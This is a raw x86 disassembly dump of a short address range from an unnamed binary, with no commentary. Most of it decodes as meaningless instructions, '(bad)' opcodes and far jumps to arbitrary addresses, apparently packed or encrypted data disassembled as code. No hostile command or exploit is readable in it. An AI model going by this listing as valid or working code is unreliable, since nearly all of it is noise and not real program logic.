  415a0a:	add    bl,BYTE PTR [edx-0x7a]
  415a0d:	xchg   ebx,eax
  415a0e:	inc    ebp
  415a0f:	or     BYTE PTR [ecx-0x2e],dl
  415a12:	leave  
  415a13:	mov    bh,0x88
  415a15:	push   edx
  415a16:	popa   
  415a17:	xchg   edx,eax
  415a18:	fs mov ch,0x17
  415a1b:	inc    ebx
  415a1c:	(bad)  
  415a1d:	adc    esi,DWORD PTR [esi]
  415a1f:	nop
  415a20:	retf   
  415a21:	xchg   edx,eax
  415a22:	or     esi,ebp
  415a24:	arpl   WORD PTR [esi],si
  415a26:	sbb    ebp,DWORD PTR [esi]
  415a28:	cs in  al,0x7f
  415a2b:	mov    esi,ecx
  415a2d:	xchg   ebx,eax
  415a2e:	xchg   ebx,eax
  415a2f:	xchg   ecx,eax
  415a30:	clc    
  415a31:	leave  
  415a32:	sub    DWORD PTR [edx-0x1887d041],ebx
  415a38:	adc    DWORD PTR [edx+0x7a],edi
  415a3b:	dec    ebx
  415a3c:	jnp    0x415a34
  415a3e:	pslld  mm7,QWORD PTR [eax-0x1d]
  415a42:	loop   0x415a48
  415a44:	push   esi
  415a45:	dec    esi
  415a46:	add    esi,DWORD PTR [edx+edx*4]
  415a49:	xor    al,0x38
  415a4b:	sbb    al,0x62
  415a4d:	call   0x587e:0x6ac266ba
  415a54:	xchg   DWORD PTR [edi+0x3],ecx
  415a57:	(bad)  [edx]
  415a59:	pop    edi
  415a5a:	outs   dx,BYTE PTR ds:[esi]
  415a5b:	add    al,0x62
  415a5d:	cmp    BYTE PTR [eax],ch
  415a5f:	adc    ah,BYTE PTR [edx+0x7b]
  415a62:	push   ebp
  415a63:	(bad)  
  415a64:	push   ss
  415a65:	adc    BYTE PTR [edx-0x5],0xfa
  415a69:	in     al,dx
  415a6a:	sub    ebp,DWORD PTR [edx-0x3731174]
  415a70:	add    eax,0x34583a76
  415a75:	adc    al,0x26
  415a77:	jnp    0x4159fb
  415a79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a7a:	pop    ebp
  415a7b:	ret    0x57c1
  415a7e:	adc    ah,BYTE PTR [edi-0x77]
  415a81:	add    ecx,esi
  415a83:	jne    0x4136c2
  415a89:	mov    ecx,DWORD PTR [ebp-0x20]
  415a8c:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  415a93:	mov    dl,BYTE PTR [ebp-0x1]
  415a96:	cmp    cl,dl
  415a98:	je     0x420d32
  415a9e:	jmp    0x417e2b
  415aa3:	jb     0x415a63
  415aa5:	or     eax,0x7679f979
  415aaa:	mov    eax,ds:0xde6af8ab
  415aaf:	mov    DWORD PTR [edx-0x55],ecx
  415ab2:	inc    edi
  415ab3:	dec    esi
  415ab4:	push   edi
  415ab5:	jge    0x415b31
  415ab7:	or     bl,BYTE PTR [edi+0x7a]
  415aba:	jp     0x415a50
  415abc:	jmp    0x165f41e7
  415ac1:	in     eax,0xdd
  415ac3:	cmc    
  415ac4:	mov    DWORD PTR [esi+0x4810edda],ecx
  415aca:	mov    bl,0x77
  415acc:	inc    ecx
  415acd:	loopne 0x415b29
  415acf:	mov    bl,0x23
  415ad1:	dec    edi
  415ad2:	inc    BYTE PTR [edx]
  415ad4:	dec    ebx
  415ad5:	xor    DWORD PTR [eax],0x1c
  415ad8:	addr16 push cs
  415ada:	or     eax,esi
  415adc:	mov    DWORD PTR [ebx],esp
  415ade:	retf   
  415adf:	cmp    eax,0xa7dde85a
  415ae4:	ror    BYTE PTR [edx],1
  415ae6:	xor    ebp,0x4b
  415ae9:	adc    bh,BYTE PTR [esi]
  415aeb:	push   es
  415aec:	nop
  415aed:	ret    
  415aee:	ss int3 
  415af0:	xchg   edx,eax
  415af1:	jmp    0x1a3be0c4
  415af6:	add    al,0x5c
  415af8:	xor    esi,DWORD PTR [esi+0x11eb6d14]
  415afe:	aas    
  415aff:	xor    cl,dl
  415b01:	sbb    al,0x5e
  415b03:	inc    edi
  415b04:	add    ebx,esi
  415b06:	test   BYTE PTR [edi+0x76],bh
  415b09:	mov    ch,0x17
  415b0b:	cmp    ch,BYTE PTR [eax]
  415b0d:	call   0x37f1c85c
  415b12:	outs   dx,BYTE PTR ds:[esi]
  415b13:	test   al,0x9b
  415b15:	enter  0x2e6c,0x5c
  415b19:	test   BYTE PTR [esi],0x6e
  415b1c:	push   ss
  415b1d:	js     0x415b83
  415b1f:	dec    eax
  415b20:	sbb    DWORD PTR [edi+0xf],eax
  415b23:	xchg   BYTE PTR [edx-0x6bc8399a],dh
  415b29:	sub    ecx,DWORD PTR [ebx*1+0x5773bd98]
  415b30:	jns    0x415afb
  415b32:	leave  
  415b33:	lods   eax,DWORD PTR ds:[esi]
  415b34:	and    DWORD PTR [edx],edi
  415b36:	push   0x50
  415b38:	sub    DWORD PTR [edi+0x6d],esp
  415b3b:	mov    eax,ds:0x6fe6f24b
  415b40:	js     0x415b85
  415b42:	jbe    0x415b8d
  415b44:	sub    ecx,DWORD PTR [edi]
  415b46:	push   es
  415b47:	mov    cl,0xb8
  415b49:	lods   al,BYTE PTR ds:[esi]
  415b4a:	sbb    DWORD PTR [ebx-0x1f],ebp
  415b4d:	lods   al,BYTE PTR ds:[esi]
  415b4e:	inc    edx
  415b4f:	call   0x5d2c09bb
  415b54:	(bad)  [eax]
  415b56:	or     edi,esi
  415b58:	mov    gs,WORD PTR [edi+0x77]
  415b5b:	(bad)  
  415b5c:	adc    BYTE PTR [esi+ebp*1],bl
  415b5f:	mov    ebx,0x826d34b2
  415b64:	push   0x4a
  415b66:	cmc    
  415b67:	aaa    
  415b68:	or     eax,0x5307d8a1
  415b6d:	(bad)  
  415b6e:	xchg   esi,eax
  415b6f:	ds sub al,0x1
  415b72:	push   es
  415b73:	inc    esi
  415b74:	xchg   DWORD PTR [ebp+0x3f],edx
  415b77:	mov    al,0x38
  415b79:	xor    edx,edi
  415b7b:	daa    
  415b7c:	popf   
  415b7d:	test   bh,al
  415b7f:	push   0xffffffd9
  415b81:	dec    edx
  415b82:	jb     0x415b78
  415b84:	jl     0x415bd9
  415b86:	mov    esp,0x110eb6f4
  415b8b:	fwait
  415b8c:	and    esi,DWORD PTR [ecx]
  415b8e:	add    bh,BYTE PTR ds:0x8376fac4
  415b94:	jl     0x415c09
  415b96:	leave  
  415b97:	jbe    0x415c14
  415b99:	sub    dh,BYTE PTR [eax+0x1f]
  415b9c:	jb     0x415be8
  415b9e:	and    BYTE PTR [eax+0x7e98f995],dl
  415ba4:	sti    
  415ba5:	lock add DWORD PTR [edx+0x2b],0xdeb44c49
  415bad:	cmp    dh,bh
  415baf:	mulps  xmm0,XMMWORD PTR [eax]
  415bb2:	mov    esp,0x206fe5b
  415bb7:	btc    DWORD PTR [eax-0x55],0x8f
  415bbc:	rcr    DWORD PTR [ebx],1
  415bbe:	mov    esi,0x1753a412
  415bc3:	mov    al,ds:0xa6c7bb4a
  415bc8:	pop    esi
  415bc9:	lods   al,BYTE PTR ds:[esi]
  415bca:	adc    BYTE PTR [edi+0x7c],cl
  415bcd:	sbb    BYTE PTR [ebx-0x3e90b01e],al
  415bd3:	cwde   
  415bd4:	cmp    eax,0x5e3918be
  415bd9:	fidiv  DWORD PTR [esi-0x5]
  415bdc:	mov    esp,0xcd97d72f
  415be1:	add    ch,ch
  415be3:	out    0xa9,eax
  415be5:	cmp    BYTE PTR [eax-0x11],cl
  415be8:	stos   DWORD PTR es:[edi],eax
  415be9:	fimul  DWORD PTR [eax+esi*1+0x204119fd]
  415bf0:	and    al,0x83
  415bf2:	cmp    al,0x5a
  415bf4:	shl    BYTE PTR [edi+0x11d288cb],cl
  415bfa:	mov    ah,0x6d
  415bfc:	cmc    
  415bfd:	fiadd  WORD PTR [ebx+0x3ccecd28]
  415c03:	mov    ecx,0x3f8bebf7
  415c08:	stc    
  415c09:	push   edi
  415c0a:	mov    eax,ds:0xf6c1119b
  415c0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c10:	or     DWORD PTR [edi],edx
  415c12:	push   esi
  415c13:	cdq    
  415c14:	hlt    
  415c15:	or     DWORD PTR [ecx+0x4cf5bc78],esp
  415c1b:	dec    edi
  415c1c:	and    bl,bh
  415c1e:	xchg   ebp,eax
  415c1f:	cmp    eax,0xf9b80610
  415c24:	sbb    DWORD PTR [ebp-0x5b],esi
  415c27:	leave  
  415c28:	in     al,dx
  415c29:	imul   eax,DWORD PTR [esp+ebx*8],0xd9713641
  415c30:	mov    bh,0x4
  415c32:	pop    ecx
  415c33:	cmp    BYTE PTR [edi],0x45
  415c36:	jge    0x415bff
  415c38:	sbb    al,0xb1
  415c3a:	ret    
  415c3b:	xchg   edx,eax
  415c3c:	jmp    0xbe415583
  415c41:	pop    esp
  415c42:	xor    ecx,DWORD PTR [eax+0x4b969608]
  415c48:	inc    edi
  415c49:	mov    bl,0x56
  415c4b:	cmp    eax,0x2da26c44
  415c50:	push   ss
  415c51:	dec    eax
  415c52:	cmp    dh,0x6b
  415c55:	push   es
  415c56:	repnz xchg edi,eax
  415c58:	sbb    eax,0xfb4163da
  415c5d:	or     ebp,DWORD PTR [ecx+0x5d]
  415c60:	inc    edi
  415c61:	popf   
  415c62:	out    0x0,al
  415c64:	sar    BYTE PTR [edi+0x6],cl
  415c67:	(bad)  
  415c69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c6a:	add    al,0xcc
  415c6c:	jl     0x415cb1
  415c6e:	ja     0x415cdc
  415c70:	mov    ecx,0xcd55508
  415c75:	rol    BYTE PTR [esi+edi*8+0x79],0x85
  415c7a:	jo     0x415cf7
  415c7c:	data16 sbb BYTE PTR [edi],dh
  415c7f:	(bad)  
  415c80:	mov    eax,0xb23116a0
  415c85:	fcmovu st,st(7)
  415c87:	das    
  415c88:	ret    
  415c89:	add    esi,esp
  415c8b:	scas   eax,DWORD PTR es:[edi]
  415c8c:	rcl    BYTE PTR ds:0xfcdab4b7,0x18
  415c93:	int    0xc4
  415c95:	test   dl,ah
  415c97:	ret    0x8cc9
  415c9a:	gs stos BYTE PTR es:[edi],al
  415c9c:	sub    ah,BYTE PTR [esi+0x6ec9e69a]
  415ca2:	and    dl,dh
  415ca4:	outs   dx,BYTE PTR ds:[esi]
  415ca5:	adc    eax,0xadc3df29
  415caa:	cld    
  415cab:	sub    eax,0x5cd360fd
  415cb0:	jp     0x415c3f
  415cb2:	mov    WORD PTR [ebx+0x6a3af563],?
  415cb8:	loopne 0x415c78
  415cba:	sbb    BYTE PTR ds:0x459eab44,0x5d
  415cc1:	pand   mm7,QWORD PTR [edx]
  415cc4:	das    
  415cc5:	sbb    al,0xcb
  415cc7:	icebp  
  415cc8:	mov    edi,ds
  415cca:	mov    edx,0x43af5cfb
  415ccf:	xchg   ecx,eax
  415cd0:	(bad)  
  415cd1:	jnp    0x415c88
  415cd3:	gs mov cl,0x48
  415cd6:	sar    DWORD PTR [edx-0x353cfb77],cl
  415cdc:	mov    ebx,DWORD PTR [ecx-0x5abd1ba6]
  415ce2:	xor    DWORD PTR [eax-0x12],esi
  415ce5:	daa    
  415ce6:	int    0x65
  415ce8:	xchg   ebx,eax
  415ce9:	out    0xdd,eax
  415ceb:	imul   DWORD PTR [edi+eiz*1]
  415cee:	mov    dl,0x8d
  415cf0:	ins    BYTE PTR es:[edi],dx
  415cf1:	call   0xcdd191fd
  415cf6:	icebp  
  415cf7:	jno    0x415d4d
  415cf9:	mov    dl,0x2e
  415cfb:	cmp    al,0x6f
  415cfd:	inc    esp
  415cfe:	test   ah,bl
  415d00:	je     0x415cd9
  415d02:	pop    ss
  415d03:	popa   
  415d04:	cmp    eax,0x139b5be7
  415d09:	stos   BYTE PTR es:[edi],al
  415d0a:	outs   dx,DWORD PTR ds:[esi]
  415d0b:	daa    
  415d0c:	ins    DWORD PTR es:[edi],dx
  415d0d:	stos   BYTE PTR es:[edi],al
  415d0e:	inc    ecx
  415d0f:	cmp    al,BYTE PTR [edx+0x76bf4719]
  415d15:	rcr    BYTE PTR [ecx+eax*4-0x16],0x35
  415d1a:	lds    esp,FWORD PTR [edi+0x315d5b87]
  415d20:	cld    
  415d21:	cli    
  415d22:	cli    
  415d23:	jmp    0x415d69
  415d25:	pop    esi
  415d26:	inc    esp
  415d27:	popa   
  415d28:	jne    0x415cb7
  415d2a:	jge    0x415cd0
  415d2c:	mov    DWORD PTR [eax],edx
  415d2e:	mov    esp,0x9975377b
  415d33:	cmp    dh,BYTE PTR [edi-0x2a]
  415d36:	adc    al,BYTE PTR [ebx+0x44099ac3]
  415d3c:	shl    DWORD PTR [esi],1
  415d3e:	shl    BYTE PTR [eax],cl
  415d40:	add    ecx,esp
  415d42:	call   0xb84:0x33526e61
  415d49:	(bad)
  415d4d:	or     eax,0x10009f23
  415d52:	jnp    0x415d7c
  415d54:	sbb    eax,0xf2044460
  415d59:	sbb    al,0x38
  415d5b:	in     eax,dx
  415d5c:	dec    ebp
  415d5d:	aam    0xea
  415d5f:	ins    BYTE PTR es:[edi],dx
  415d60:	test   al,0xa9
  415d62:	(bad)  
  415d63:	fld    QWORD PTR [ebx-0x55]
  415d66:	cmp    bl,BYTE PTR [ecx]
  415d68:	jge    0x415d51
  415d6a:	dec    esi
  415d6b:	xchg   ecx,eax
  415d6c:	xor    eax,DWORD PTR [eax+0x13]
  415d6f:	xchg   esp,eax
  415d70:	scas   al,BYTE PTR es:[edi]
  415d71:	sar    ebx,0xb0
  415d74:	ret    0xb721
  415d77:	sar    al,0x75
  415d7a:	in     eax,0x25
  415d7c:	inc    esp
  415d7d:	js     0x415d43
  415d7f:	mov    bl,0x94
  415d81:	pop    ds
  415d82:	mov    DWORD PTR [ebx-0x24af438f],ecx
  415d88:	in     eax,0xf5
  415d8a:	cmp    BYTE PTR [ecx-0x75],bh
  415d8d:	or     al,0xe
  415d8f:	push   ds
  415d90:	mov    ebx,0x9d073900
  415d95:	xor    al,0x2e
  415d97:	xor    DWORD PTR [eax],edx
  415d99:	test   bh,ah
  415d9b:	sar    ecx,cl
  415d9d:	imul   ebp,DWORD PTR [esi+eiz*4+0x574cecf0],0x651dd105
  415da8:	gs and eax,0xc108bcee
  415dae:	fadd   DWORD PTR [ebx]
  415db0:	add    DWORD PTR [eax],eax
  415db2:	(bad)  
  415db3:	inc    edx
  415db4:	xor    al,0x78
  415db6:	or     al,BYTE PTR [edx-0x4074111c]
  415dbc:	imul   ebx,DWORD PTR [ebx],0x2f
  415dbf:	and    DWORD PTR [edx],0x6ebf2d38
  415dc5:	jmp    0xff9f:0x5603990
  415dcc:	cmc    
  415dcd:	data16 xlat BYTE PTR ds:[ebx]
  415dcf:	xor    DWORD PTR [ecx+0x5],esp
  415dd2:	aam    0x30
  415dd4:	push   ebx
  415dd5:	and    ebp,DWORD PTR [edi+0x37]
  415dd8:	pop    esi
  415dd9:	cwde   
  415dda:	pusha  
  415ddb:	retf   0x9b7b
  415dde:	outs   dx,DWORD PTR ds:[esi]
  415ddf:	popf   
  415de0:	jmp    0x415e51
  415de2:	sbb    al,0xb5
  415de4:	retf   0x6399
  415de7:	fist   DWORD PTR ds:0xe2df955f
  415ded:	xchg   ecx,eax
  415dee:	adc    ecx,DWORD PTR [ebp-0x78545712]
  415df4:	les    ebx,FWORD PTR [eax+edi*1+0x59]
  415df8:	mov    eax,0x50833283
  415dfd:	(bad)  [edx-0x19b0ca37]
  415e03:	loopne 0x415dd7
  415e05:	mov    dh,BYTE PTR [ebx-0x29cc5e38]
  415e0b:	loop   0x415e47
  415e0d:	rcr    ecx,cl
  415e0f:	mov    edx,0x345dc679
  415e14:	leave  
  415e15:	stc    
  415e16:	int    0x7c
  415e18:	pop    ebx
  415e19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e1b:	xlat   BYTE PTR ds:[ebx]
  415e1c:	sar    DWORD PTR ds:0x4d587248,cl
  415e22:	mov    esp,0xddab770a
  415e27:	mov    bl,0xf0
  415e29:	fisub  WORD PTR [edx-0x40]
  415e2c:	jl     0x415e89
  415e2e:	dec    ecx
  415e2f:	out    0x34,eax
  415e31:	loopne 0x415df0
  415e33:	push   esi
  415e34:	scas   eax,DWORD PTR es:[edi]
  415e35:	adc    ecx,DWORD PTR [esi+0x4f819964]
  415e3b:	jmp    0x415ebc
  415e3d:	sbb    DWORD PTR [ecx+0x6a],esi
  415e40:	shl    DWORD PTR ds:0xef5d796b,1
  415e46:	rcr    BYTE PTR [edi+0x9],cl
  415e49:	shl    DWORD PTR [ecx],1
  415e4b:	icebp  
  415e4c:	cs popa 
  415e4e:	sub    ecx,DWORD PTR [edx]
  415e50:	(bad)  
  415e51:	and    DWORD PTR [eax+0x762b8e0e],0xf8127e8b
  415e5b:	iret   
  415e5c:	daa    
  415e5d:	push   ebx
  415e5e:	push   esi
  415e5f:	dec    ebp
  415e60:	ja     0x415ec1
  415e62:	add    al,0xf5
  415e64:	enter  0x3109,0x3d
  415e68:	div    DWORD PTR [eax]
  415e6a:	mov    edi,0xedd9876c
  415e6f:	sar    dl,cl
  415e71:	lods   al,BYTE PTR ds:[esi]
  415e72:	repz cmp al,0x98
  415e75:	cld    
  415e76:	and    ah,BYTE PTR [esi-0x7b]
  415e79:	aad    0xa0
  415e7b:	adc    al,0x93
  415e7d:	and    BYTE PTR [ecx],dl
  415e7f:	xchg   esp,eax
  415e80:	inc    ecx
  415e81:	shl    BYTE PTR [edx+0x27fa025b],0x8d
  415e88:	std    
  415e89:	and    BYTE PTR [ebx],ah
  415e8b:	ret    0xb87c
  415e8e:	xchg   esp,eax
  415e8f:	les    ebx,FWORD PTR [edx+0x3111e32d]
  415e95:	aam    0xa8
  415e97:	pop    ss
  415e98:	rol    dh,0xd0
  415e9b:	jmp    0xce148ddd
  415ea0:	sub    edx,0x7017a36a
  415ea6:	out    0x86,al
  415ea8:	push   ds
  415ea9:	iret   
  415eaa:	sbb    bl,bl
  415eac:	stc    
  415ead:	stos   BYTE PTR es:[edi],al
  415eae:	xor    BYTE PTR [edx+0x60],cl
  415eb1:	lds    ebp,FWORD PTR [eax+edx*2+0x1a46b4d5]
  415eb8:	out    0x26,eax
  415eba:	cwde   
  415ebb:	pushf  
  415ebc:	repz sbb BYTE PTR [esi-0x4c937b83],ah
  415ec3:	pop    ebp
  415ec4:	pop    esi
  415ec5:	retf   
  415ec6:	jecxz  0x415e90
  415ec8:	js     0x415ef6
  415eca:	xor    ah,BYTE PTR [ecx]
  415ecc:	sub    al,0x6e
  415ece:	wbinvd 
  415ed0:	xor    ebp,DWORD PTR [edx-0x2]
  415ed3:	and    BYTE PTR [edi-0x68562776],0xc3
  415eda:	int    0x34
  415edc:	sub    esp,DWORD PTR [ecx-0x4]
  415edf:	jmp    0x3718:0x658770b8
  415ee6:	mov    gs,WORD PTR [edx-0xb498ba]
  415eec:	pop    edi
  415eed:	mov    al,0x8b
  415eef:	xchg   esi,eax
  415ef0:	fmul   st(5),st
  415ef2:	pop    ecx
  415ef3:	or     ebp,edx
  415ef5:	popf   
  415ef6:	stos   DWORD PTR es:[edi],eax
  415ef7:	(bad)  
  415ef8:	clc    
  415ef9:	push   edi
  415efa:	(bad)  
  415efc:	fdiv   DWORD PTR [bp+di+0x5d9a]
  415f01:	pop    ebx
  415f02:	inc    eax
  415f03:	stos   BYTE PTR es:[edi],al
  415f04:	in     eax,dx
  415f05:	in     eax,0xb2
  415f07:	push   es
  415f08:	sbb    BYTE PTR [ecx],0x45
  415f0b:	push   ebp
  415f0c:	(bad)  
  415f0e:	nop
  415f0f:	inc    esp
  415f10:	aam    0xbb
  415f12:	sbb    bh,ch
  415f14:	arpl   WORD PTR [esi],cx
  415f16:	cmp    dh,BYTE PTR [ecx-0x6f]
  415f19:	addr16 call 0xdb5c:0x4d8d9a78
  415f21:	shl    cl,0xda
  415f24:	jmp    0x772b2337
  415f29:	adc    BYTE PTR [ebx+0x46],dh
  415f2c:	and    eax,0x6069b065
  415f31:	test   BYTE PTR gs:[esi],al
  415f34:	push   ebp
  415f35:	icebp  
  415f36:	ja     0x415ebd
  415f38:	mov    BYTE PTR [edi+0x60f2964f],al
  415f3e:	inc    ebx
  415f3f:	and    al,0x49
  415f41:	or     edi,0x90047e6a
  415f47:	imul   ebp,DWORD PTR gs:[di+0x6a70],0xffffffb7
  415f4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f4f:	mov    WORD PTR ds:0xb226f38d,cs
  415f55:	jo     0x415ee5
  415f57:	addr16 inc eax
  415f59:	and    ch,BYTE PTR [edi+edi*4+0x6b70a245]
  415f60:	push   ds
  415f61:	sbb    eax,0xb5088f6f
  415f66:	pop    edx
  415f67:	push   eax
  415f68:	adc    DWORD PTR [edi+eax*4+0x1c236804],edx
  415f6f:	dec    edi
  415f70:	or     al,BYTE PTR [edx]
  415f72:	xor    bh,BYTE PTR [edx-0x2d]
  415f75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415f76:	data16 ja 0x415f1c
  415f79:	jge    0x415f19
  415f7b:	out    dx,al
  415f7c:	fs retf 
  415f7e:	pop    esp
  415f7f:	(bad)  
  415f80:	shl    BYTE PTR [eax+0x14],cl
  415f83:	mov    al,ds:0x503e3344
  415f88:	inc    ebx
  415f89:	test   eax,0x5d9ec61b
  415f8e:	call   0x487f:0x9d4a6a66
  415f95:	scas   al,BYTE PTR es:[edi]
  415f96:	dec    ecx
  415f97:	push   edi
  415f98:	xchg   ebp,eax
  415f99:	daa    
  415f9a:	pop    ss
  415f9b:	bound  ebp,QWORD PTR [esi-0x6]
  415f9e:	xor    al,0xfe
  415fa0:	inc    eax
  415fa1:	mov    ah,0x8e
  415fa3:	div    DWORD PTR [eax-0x78]
  415fa6:	mov    eax,0xa5349086
  415fab:	addr16 or eax,0xccae9f5d
  415fb1:	test   DWORD PTR [esi+eiz*4+0x3a],edx
  415fb5:	push   edx
  415fb6:	or     al,0x58
  415fb8:	es iret 
  415fba:	outs   dx,BYTE PTR ds:[esi]
  415fbb:	pop    edx
  415fbc:	sbb    al,0x17
  415fbe:	aaa    
  415fbf:	pusha  
  415fc0:	loop   0x416011
  415fc2:	retf   0xd90
  415fc5:	add    al,0x99
  415fc7:	imul   ebx,DWORD PTR ds:0xacd032f4,0x91010c77
  415fd1:	mov    cl,0x40
  415fd3:	(bad)  
  415fd4:	addr16 (bad) 
  415fd6:	or     DWORD PTR [ebp+esi*8+0x56],ebx
  415fda:	mov    ebp,0x7cdf91bf
  415fdf:	outs   dx,DWORD PTR ds:[si]
  415fe1:	js     0x415fc8
  415fe3:	aaa    
  415fe4:	scas   al,BYTE PTR es:[edi]
  415fe5:	cld    
  415fe6:	fdivr  QWORD PTR [eax]
  415fe8:	or     BYTE PTR [esi-0x7904dea3],al
  415fee:	inc    edi
  415fef:	(bad)  
  415ff0:	arpl   dx,bp
  415ff2:	icebp  
  415ff3:	pop    ecx
  415ff4:	shl    DWORD PTR [eax-0x17c102e2],cl
  415ffa:	pop    esp
  415ffb:	test   esp,edi
  415ffd:	inc    bp
  415fff:	xchg   edx,eax
  416000:	lock int3 
  416002:	(bad)  [edx]
  416004:	dec    eax
  416005:	in     eax,0xd9
  416007:	outs   dx,DWORD PTR ds:[esi]
  416008:	mov    edx,0xbe9c1d8e
  41600d:	xchg   esp,eax
  41600e:	cdq    
  41600f:	adc    ebp,DWORD PTR [esi+0xe]
  416012:	(bad)  
  416013:	in     eax,0xba
  416015:	nop
  416016:	imul   esp,DWORD PTR [edi+0x25],0xffffffd5
  41601a:	out    dx,al
  41601b:	mov    ecx,0x4c4361cb
  416020:	(bad)  
  416021:	retf   0xf009
  416024:	xchg   ebp,eax
  416025:	ficomp DWORD PTR [edx+0x439121d3]
  41602b:	scas   al,BYTE PTR es:[edi]
  41602c:	mov    ch,0x4d
  41602e:	fsub   QWORD PTR [ebx]
  416030:	test   al,0x80
  416032:	shr    bh,0xe0
  416035:	shl    DWORD PTR ds:0xe4c8d26,1
  41603b:	mov    edx,0xb7c819dc
  416040:	hlt    
  416041:	ins    DWORD PTR es:[edi],dx
  416042:	push   edx
  416043:	aad    0xdd
  416045:	adc    cl,ch
  416047:	mov    ah,0xc0
  416049:	ror    DWORD PTR [ebx+ebp*4+0x1b12b2b4],1
  416050:	sub    BYTE PTR [edx-0x4c142bd6],0x44
  416057:	mov    edx,0xe71e3ea3
  41605c:	pop    ebp
  41605d:	rol    DWORD PTR fs:[ebp+0x7f],cl
  416061:	xchg   BYTE PTR [ebx+0x1a],cl
  416064:	aas    
  416065:	jae    0x416021
  416067:	ret    
  416068:	sbb    BYTE PTR [edi],bl
  41606a:	lock das 
  41606c:	push   cx
  41606e:	adc    ebp,DWORD PTR [ebx+eiz*8+0x333c748c]
  416075:	jae    0x4160bb
  416077:	in     al,dx
  416078:	(bad)  
  41607a:	mov    dh,0xa4
  41607c:	stos   BYTE PTR es:[edi],al
  41607d:	lock mov ds:0x3294068e,al
  416083:	adc    DWORD PTR [eax],ecx
  416085:	dec    ebx
  416086:	mov    DWORD PTR [eax-0x25],eax
  416089:	and    DWORD PTR [edi+0x14279ac7],eax
  41608f:	call   DWORD PTR [edx-0x169f81c]
  416095:	or     DWORD PTR [edi],0xffffffd1
  416098:	adc    DWORD PTR [eax],edx
  41609a:	fwait
  41609b:	ja     0x41605d
  41609d:	popf   
  41609e:	div    DWORD PTR [ecx+0x35f9e251]
  4160a4:	sbb    eax,DWORD PTR ds:0x7cb63e70
  4160aa:	xchg   edi,eax
  4160ab:	sbb    al,0xaf
  4160ad:	mov    WORD PTR [ebp-0x3793469e],es
  4160b3:	sub    BYTE PTR [ecx+esi*8-0x52],bh
  4160b7:	aaa    
  4160b8:	mov    cl,0x53
  4160ba:	cdq    
  4160bb:	loope  0x41609b
  4160bd:	retf   
  4160be:	je     0x416059
  4160c0:	inc    ebp
  4160c1:	cs sub eax,0xd2c15ac4
  4160c7:	pop    esi
  4160c8:	int3   
  4160c9:	lds    edi,FWORD PTR [ebx-0x5e58bb24]
  4160cf:	jle    0x4160cc
  4160d1:	ds iret 
  4160d3:	add    eax,0x34459cda
  4160d8:	aam    0x35
  4160da:	cmc    
  4160db:	dec    edi
  4160dc:	cld    
  4160dd:	jge    0x416151
  4160df:	jl     0x4160bf
  4160e1:	sub    eax,0x8bfc1dcc
  4160e6:	and    DWORD PTR ds:0xa370309d,edx
  4160ec:	mov    edx,0xf9a2efb5
  4160f1:	ins    DWORD PTR es:[edi],dx
  4160f2:	outs   dx,DWORD PTR ds:[esi]
  4160f3:	or     ah,BYTE PTR [edi+0x4a]
  4160f6:	loope  0x4160aa
  4160f8:	xor    eax,0xc6e8fa2e
  4160fd:	and    dh,BYTE PTR [ecx-0x19]
  416100:	pop    ebx
  416101:	shl    BYTE PTR [esi+0x7c],cl
  416104:	fild   QWORD PTR [ecx+0x17]
  416107:	fwait
  416108:	dec    ebx
  416109:	xor    al,BYTE PTR [bp-0x5cd2]
  41610e:	stos   DWORD PTR es:[edi],eax
  41610f:	sub    eax,0x2bb672d4
  416114:	outs   dx,BYTE PTR ds:[esi]
  416115:	icebp  
  416116:	mov    ?,WORD PTR [ebx+0x40]
  416119:	jns    0x416116
  41611b:	push   edi
  41611c:	xor    edx,esp
  41611e:	add    DWORD PTR [esi+ebp*4-0x2d],ebp
  416122:	cli    
  416123:	(bad)  
  416124:	les    edi,FWORD PTR [ebp-0x2e]
  416127:	daa    
  416128:	fsub   DWORD PTR ds:0xf20e2ae2
  41612e:	repz in al,dx
  416130:	in     eax,dx
  416131:	sbb    al,0xbd
  416133:	jp     0x416127
  416135:	and    edi,DWORD PTR [eax+0x25a92320]
  41613b:	xor    dh,BYTE PTR [ebp+0x1c]
  41613e:	inc    esi
  41613f:	daa    
  416140:	pop    es
  416141:	imul   ebp,ebp,0x44
  416144:	sbb    eax,0x9b51d951
  416149:	or     al,BYTE PTR [edx+0x42639135]
  41614f:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  416151:	aas    
  416152:	inc    edx
  416153:	daa    
  416154:	vpcmpeqd xmm3,xmm1,XMMWORD PTR [ebp-0x60]
  416159:	neg    BYTE PTR [edi+ebp*4]
  41615c:	pushf  
  41615d:	into   
  41615e:	ins    DWORD PTR es:[edi],dx
  41615f:	jecxz  0x416129
  416161:	mov    ecx,DWORD PTR [edi+0x354c123]
  416167:	pop    ebx
  416168:	icebp  
  416169:	enter  0xdbe3,0xee
  41616d:	pop    edx
  41616e:	pop    edi
  41616f:	adc    DWORD PTR [ecx-0x2],0x4e969c93
  416176:	inc    ecx
  416177:	ds adc eax,0xf1644b70
  41617d:	mov    bl,0x3e
  41617f:	mov    esi,0x95c83a6b
  416184:	test   BYTE PTR [eax-0x5655f35e],0x4c
  41618b:	push   ebx
  41618c:	mov    eax,0x9af02c59
  416191:	arpl   di,di
  416193:	lods   al,BYTE PTR ds:[esi]
  416194:	cdq    
  416195:	into   
  416196:	pop    ss
  416197:	sub    dh,BYTE PTR [edx]
  416199:	cmp    al,0x2a
  41619b:	pushf  
  41619c:	mov    bh,0x63
  41619e:	cwde   
  41619f:	or     eax,0x388995b5
  4161a4:	cmc    
  4161a5:	xchg   ebp,eax
  4161a6:	push   esi
  4161a7:	mov    esi,0xc400ba5a
  4161ac:	mov    ds:0xca0441cc,al
  4161b1:	lods   eax,DWORD PTR ds:[esi]
  4161b2:	pop    es
  4161b3:	lds    ebx,FWORD PTR [ebx-0x2b7c5f7d]
  4161b9:	sub    eax,0x1e5d4013
  4161be:	xor    ebp,DWORD PTR [edx+0x1e30316a]
  4161c4:	out    dx,eax
  4161c5:	or     ecx,esi
  4161c7:	jns    0x4161e0
  4161c9:	mov    esi,0x479664e7
  4161ce:	xchg   BYTE PTR [ecx+edx*1],dl
